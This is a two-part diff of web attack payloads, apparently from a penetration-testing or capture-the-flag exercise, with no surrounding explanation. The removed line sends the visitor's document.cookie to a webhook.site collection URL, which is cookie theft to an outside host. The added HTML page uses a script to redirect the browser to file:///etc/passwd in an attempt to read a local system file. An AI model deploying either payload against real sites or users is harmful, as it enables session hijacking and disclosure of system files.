@@ -1,1 +1,10 @@
-fetch('https://webhook.site/b08bc320-7e87-4a6e-b0c6-7a85a8fcd740?c=' + document.cookie)
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        window.location.href = 'file:///etc/passwd';
+    </script>
+</body>
+
+</html>
